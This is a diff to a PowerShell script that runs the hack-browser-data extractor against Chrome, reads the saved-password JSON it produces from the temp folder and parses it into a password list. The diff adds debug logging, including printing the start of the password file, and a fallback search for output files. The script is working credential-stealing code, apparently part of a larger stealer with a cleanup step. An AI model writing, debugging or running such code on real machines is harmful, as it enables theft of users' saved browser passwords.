@@ -31,17 +31,40 @@ try {
     # Run the tool
     $exePath = "$extractPath\hack-browser-data.exe"
     Log "Running extractor..."
+    Log "Executable path: $exePath"
+    Log "Exists: $(Test-Path $exePath)"
     
     $output = & $exePath --browser chrome --results-dir "$env:TEMP\chrome_results" --format json 2>&1 | Out-String
+    Log "Tool output: $output"
     Log "Extraction complete"
+    
+    # List all files created
+    if (Test-Path "$env:TEMP\chrome_results") {
+        $files = Get-ChildItem "$env:TEMP\chrome_results" -Recurse
+        Log "Files created:"
+        foreach ($file in $files) {
+            Log "  - $($file.Name) ($($file.Length) bytes)"
+        }
+    } else {
+        Log "Results directory not created!"
+    }
     
     # Parse JSON results
     $resultsFile = "$env:TEMP\chrome_results\chrome_password.json"
     
+    Log "Looking for results at: $resultsFile"
+    Log "File exists: $(Test-Path $resultsFile)"
+    
     $passwords = @()
     
     if (Test-Path $resultsFile) {
-        $jsonData = Get-Content $resultsFile -Raw | ConvertFrom-Json
+        $rawContent = Get-Content $resultsFile -Raw
+        Log "File content length: $($rawContent.Length) chars"
+        Log "First 200 chars: $($rawContent.Substring(0, [Math]::Min(200, $rawContent.Length)))"
+        
+        $jsonData = $rawContent | ConvertFrom-Json
+        
+        Log "JSON entries count: $($jsonData.Count)"
         
         foreach ($entry in $jsonData) {
             $passwords += @{
@@ -54,6 +77,13 @@ try {
         Log "Parsed $($passwords.Count) passwords"
     } else {
         Log "No results file found at: $resultsFile"
+        
+        # Try to find any JSON files
+        $allJsonFiles = Get-ChildItem "$env:TEMP\chrome_results" -Filter *.json -Recurse -ErrorAction SilentlyContinue
+        Log "All JSON files found: $($allJsonFiles.Count)"
+        foreach ($f in $allJsonFiles) {
+            Log "  Found: $($f.FullName)"
+        }
     }
     
     # Cleanup
